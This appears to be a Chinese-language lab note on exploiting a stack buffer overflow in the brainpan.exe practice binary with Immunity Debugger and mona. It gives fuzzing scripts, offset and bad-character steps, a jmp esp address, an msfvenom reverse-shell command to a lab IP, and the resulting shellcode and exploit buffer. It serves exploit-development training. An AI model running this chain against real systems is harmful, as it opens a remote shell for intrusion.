###### Software
**Immunity Debugger**
分别为汇编代码，寄存器情况，内存窗口，堆栈窗口
右下角为当前运行状态

```
!mona_modules 查看当前所有模块状态
```


###### 前言
- 寄存器
(E 为 Extended, 扩展，表示为32为寄存器)
EAX : 累加寄存器
EBX : 基质寄存器
ECX : 计数寄存器
EDX : 数据寄存器
ESI : 元索引寄存器
EDI : 目标索引寄存器
ESP : 栈指针
EBP : 基址指针
EIP : 指令指针(下一指针指向)

CS : 代码段寄存器
DS : 数据段寄存器
EFL : 标志寄存器


###### 流程
**0x01 先探测大概在什么范围缓冲区会溢出**
```bash
python ~/tools/bufferoverflow_test.py
```

- bufferoverflow_test.py
```python
#!/usr/bin/python3
import socket
import time
import sys

size = 100

while True:
    try:
        print("\n[+] Sending buffer with size: %s bytes" % size)
        buffer = 'A' * size  

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.55.130", 9999))  
        s.send(buffer.encode())  
        s.close()

        size += 100  
        time.sleep(3)  

    except Exception as e:
        print(f"[-] Could not connect: {e}")
        sys.exit()
```


**0x02 确定大概范围后再次确定具体范围**
```bash
msf-pattern_create -l 600   (创建字符串，再次发送数据后确定在哪一个字符往后会溢出)

python ~/tools/bufferoverflow_exact_strings_send.py
[+] Sending buffer
```

- bufferoverflow_exact_strings_send.py
```bash
#!/usr/bin/python3
import socket
import time
import sys

try:
        print("\n[+] Sending buffer")
        buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9' # change this!

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.55.1", 9999))
        s.send(buffer.encode())
        s.close()

        time.sleep(3)

except Exception as e:
        print(f"[-] Could not connect: {e}")
        sys.exit()
```


**0x03 查看寄存器 EIP （下一指针指向）寄存器的值，为 `35724134`**
结合这个值确定精确在哪一个字符会导致溢出：
```bash
msf-pattern_offset -l 600 -q 35724134
[*] Exact match at offset 524
```


**0x04 验证可容纳多少 payload**
继续修改脚本：
```bash
buffer = "A" * 524 + "B" * 4 + "C" * 500 (bufferoverflow_verify.py)

python ~/tools/bufferoverflow_verify.py
```

查找字符串 c 溢出了多少
```python
>>> 0x005FFAE4-0x005FF910
468
```
实际可使用 payload 字节为468


**0x05 判断坏字节**
```bash
pip install badchars 
badchars -f python

修改bufferoverflow_badcharsCheck.py，把C * 500 改为badchars , 检查是否有无法输出的坏字符
```

发送后定位到 esp 寄存器地址，右键 dump 到内存查看，只要看到不连续的
比如 `00` 截断，那就是 badchar
```bash
badchars = "\x00"  (bufferoverflow_badchars_Result.py)
```


**0x06 查找当前 jmp esp 的内存地址** 
（将 jmp esp 放在字符串 ` B * 4` 中， esp 寄存器中可用范围就成了我们执行 payload 的地方）

- 0x01 直接搜索 `!mona jump -r esp`
```
[+] Result :
	0x311712F3 : no jmp : xxxxxxxxxxxxxxxxxxxxxxxx
0x311712F3 就是内存地址
```

- 0x02 
```bash
msf-nasm_shell  (kali)
nasm > jmp esp
00000000  FFE4              jmp esp
```
其中， FFE4为操作码 (opcode)，通过操作码在 immunity debugger 中查找 `jmp esp` 的内存地址

在 Immunity Debugger 中输入 `!mona modules` , 显示目标进程加载的模块列表及其详细信息
寻找都是 False 的 module , 继续输入命令：
```
!mona find -s '\xff\xe4' -m brainpan.exe
```
-s: 搜索操作码
-m: 指定 module 

```
0x311712f3 : '\xff\xe4' |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\13461\Desktop\brainpan.exe), 0x0
```
`0x311712f3` 就是 '\xff\xe4' , 也就是 'jmp esp' 的内存地址


**0x07 创建 payload, rev shell** 
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.55.128 LPORT=443 -b '\x00' -e x86/shikata_ga_nai -f c
```
-b: 避免 badchar
-e: 使用编码器 
（x86/shikata_ga_nai 为一个多态编码器, 用于加密和混淆 payload）
-f: 输出指定格式

**修改缓冲区溢出利用代码**
```python
	shellcode = (b"\xb8\xc5\x35\xcb\x04\xdb\xcb\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x12\x31\x43\x12\x83\xeb\xfc\x03\x86\x3b\x29\xf1\x39"
b"\x9f\x5a\x19\x6a\x5c\xf6\xb4\x8e\xeb\x19\xf8\xe8\x26\x59"
b"\x6a\xad\x08\x65\x40\xcd\x20\xe3\xa3\xa5\x72\xbb\x63\xb5"
b"\x1b\xbe\x8b\xb4\x60\x37\x6a\x06\xf0\x18\x3c\x35\x4e\x9b"
b"\x37\x58\x7d\x1c\x15\xf2\x10\x32\xe9\x6a\x85\x63\x22\x08"
b"\x3c\xf5\xdf\x9e\xed\x8c\xc1\xae\x19\x42\x81")
	buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 16 + shellcode
```

**其中**
`"\xf3\x12\x17\x31"` 为 ` jmp esp ` 的内存的 **倒序** , 因为进出顺序不同
`"\x90" * 16` 为 nop (\x90) 操作，为避免可能存在的一些错误字符预留16字节空间
**注意字符编码，增加 b 声明为字节对象 byte**

执行后即可获得 rev shell







* * **
###### Issue
- Immunity Debugger 缺少 python27.dll
https://blog.csdn.net/qq_31721897/article/details/124076326

- Immunity Debugger : !mona 时 pycommand 报错
https://github.com/corelan/mona/blob/master/mona.py
下载 mona.py 后放在   `Immunity Debugger\PyCommands`  下